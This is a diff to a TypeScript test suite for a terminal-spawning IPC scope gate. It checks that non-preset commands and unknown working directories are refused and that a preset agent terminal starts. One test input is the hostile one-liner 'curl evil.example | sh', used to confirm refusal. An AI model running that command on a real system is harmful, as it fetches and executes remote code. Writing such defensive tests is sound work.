@@ -149,15 +149,17 @@ describe('file/git/pty scoping (server side mirrors desktop validators)', () => 
     expect(snap?.changes).toEqual([])
   })
 
-  it('pty:create with a command is refused; spawn outside known projects too', async () => {
-    // refusal shape: { ok: false, error } from the scope gate
+  it('pty:create refuses non-preset commands and unknown explicit cwds', async () => {
+    // refusal shape: { ok: false, error } from the scope gate. Commands are
+    // allowed only as the renderer-emittable presets (agent registry + druk);
+    // an explicit cwd must be a known project; cwd-less spawns are fine.
     const withCommand = await dispatch({
       id: 0, method: IPC.ptyCreate,
       args: [{ id: 't1', command: 'curl evil.example | sh' }]
     })
     const cmdRes = withCommand?.result as { ok?: boolean; error?: string }
     expect(cmdRes?.ok).toBe(false)
-    expect(cmdRes?.error).toMatch(/command/i)
+    expect(cmdRes?.error).toMatch(/preset/i)
 
     const unknownCwd = await dispatch({
       id: 0, method: IPC.ptyCreate,
@@ -166,5 +168,18 @@ describe('file/git/pty scoping (server side mirrors desktop validators)', () => 
     const cwdRes = unknownCwd?.result as { ok?: boolean; error?: string }
     expect(cwdRes?.ok).toBe(false)
     expect(cwdRes?.error).toMatch(/known project/i)
+  })
+
+  it('pty:create spawns a cwd-less preset terminal (agent node in Welcome)', async () => {
+    const res = await dispatch({
+      id: 0, method: IPC.ptyCreate,
+      args: [{ id: 't3', command: 'claude' }]
+    })
+    const created = res?.result as { id?: string; pid?: number; ok?: boolean; error?: string }
+    // Success shape is PtyCreateResult ({id,pid,fresh}) — refusals carry {ok:false,error}.
+    expect(created?.ok).toBeUndefined()
+    expect(created?.id).toBe('t3')
+    expect(typeof created?.pid).toBe('number')
+    await dispatch({ id: 0, method: IPC.ptyDestroy, args: ['t3'] })
   })
 })
